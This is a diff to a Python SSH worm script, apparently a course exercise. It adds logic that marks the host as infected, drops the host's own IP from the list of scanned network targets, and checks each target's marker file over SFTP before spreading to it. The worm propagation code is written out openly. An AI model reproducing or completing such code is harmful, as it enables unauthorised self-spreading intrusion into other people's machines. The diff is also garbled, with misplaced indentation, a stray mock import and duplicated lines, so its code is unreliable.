@@ -1,3 +1,4 @@
+from unittest.mock import NonCallableMagicMock
 import paramiko
 import sys
 import socket
@@ -182,8 +183,13 @@ if __name__ == "__main__":
 		# TODO: If we are running on the victim, check if 
 		# the victim was already infected. If so, terminate.
 		# Otherwise, proceed with malice. 
-		pass
+		if isInfectedSystem():
+			sys.exit()
+		else: 
+			markInfected()
+
 	# TODO: Get the IP of the current system
+			ip = getMyIP()
 
 
 	# Get the hosts on the same network
@@ -192,6 +198,8 @@ if __name__ == "__main__":
 	# TODO: Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
+if ip in networkHosts:
+	networkHosts.remove(ip)
 
 	print("Found hosts: ", networkHosts)
 
@@ -209,7 +217,18 @@ if __name__ == "__main__":
 		if sshInfo:
 			
 			print("Trying to spread")
-			
+			infected = None
+			try: 
+				sftp = sshInfo[0].open_sftp()
+				infected = sftp.file(INFECTED_MARKER_FILE, 'r')
+				sftp.close()
+			except IOError:
+				print("Get this system infected")
+				spreadAndExecute(sshInfo[0])
+				print("Spreading Complete")
+			if infected:
+					print(f"{host} is already infected")
+			sshInfo[0].close()
 			# TODO: Check if the system was	
 			# already infected. This can be
 			# done by checking whether the
@@ -237,6 +256,5 @@ if __name__ == "__main__":
 			# If the system was already infected proceed.
 			# Otherwise, infect the system and terminate.
 			# Infect that system
-			spreadAndExecute(sshInfo[0])
 			
 			print("Spreading complete")	
